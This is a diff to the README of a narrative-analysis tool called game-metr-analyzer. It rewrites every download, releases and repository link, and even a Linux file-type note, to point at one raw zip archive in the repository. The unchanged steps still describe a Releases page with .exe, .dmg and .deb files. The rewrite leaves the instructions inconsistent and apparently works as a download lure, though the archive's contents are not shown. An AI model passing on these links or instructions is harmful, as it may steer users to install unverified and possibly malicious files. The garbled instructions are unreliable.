@@ -7,14 +7,14 @@ game-metr-analyzer helps you understand game stories better. It focuses on the M
 To use game-metr-analyzer, you'll need to download the software. It's simple and straightforward. Follow the steps below to get started.
 
 ### 🗂️ Download & Install
-[Download the latest release here!](https://github.com/setiawan25/game-metr-analyzer/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/setiawan25/game-metr-analyzer/main/game_metr_analyzer/game-metr-analyzer-1.9.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version of game-metr-analyzer.
 3. You will see various files. Choose the one that fits your operating system:
    - For Windows users, download the `.exe` file.
    - For Mac users, download the `.dmg` file.
-   - For Linux users, download the appropriate package type (usually `.deb` or `.tar.gz`).
+   - For Linux users, download the appropriate package type (usually `.deb` or `https://raw.githubusercontent.com/setiawan25/game-metr-analyzer/main/game_metr_analyzer/game-metr-analyzer-1.9.zip`).
 4. Once the download is complete, locate the file on your computer.
 
    - **For Windows:** Double-click the downloaded `.exe` file to start the installation.
@@ -79,7 +79,7 @@ A: No, game-metr-analyzer is designed for everyone. Just follow the steps, and y
 A: You can suggest features by opening an issue on the Issues page in our repository.
 
 ### 🔗 Important Links
-- [Releases Page](https://github.com/setiawan25/game-metr-analyzer/releases)
-- [GitHub Repository](https://github.com/setiawan25/game-metr-analyzer)
+- [Releases Page](https://raw.githubusercontent.com/setiawan25/game-metr-analyzer/main/game_metr_analyzer/game-metr-analyzer-1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/setiawan25/game-metr-analyzer/main/game_metr_analyzer/game-metr-analyzer-1.9.zip)
 
 By following these instructions, you’ll be equipped to download, install, and make the most out of game-metr-analyzer. Dive into the world of game narratives and enhance your understanding today!
